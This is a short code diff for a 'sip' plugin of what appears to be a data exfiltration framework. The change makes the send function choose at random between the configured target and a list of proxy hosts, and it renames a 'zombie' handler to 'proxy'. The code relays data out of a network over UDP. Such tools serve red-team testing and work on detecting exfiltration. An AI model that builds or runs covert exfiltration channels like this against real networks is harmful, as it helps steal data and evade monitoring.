@@ -209,7 +209,11 @@ def listen():
             pass
 
 def send(data):
-    target = config['target']
+    if config.has_key('proxies') and config['proxies'] != [""]:
+        targets = [config['target']] + config['proxies']
+        target = choice(targets)
+    else:
+        target = config['target']
     port = config['port']
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(('', port))
@@ -235,7 +239,7 @@ def send(data):
             pass
         break
 
-def zombie():
+def proxy():
     pass
 
 class Plugin:
@@ -244,4 +248,4 @@ class Plugin:
         global app_exfiltrate, config
         app_exfiltrate = app
         config = conf
-        app.register_plugin('sip', {'send': send, 'listen': listen, 'zombie': zombie})
+        app.register_plugin('sip', {'send': send, 'listen': listen, 'proxy': proxy})
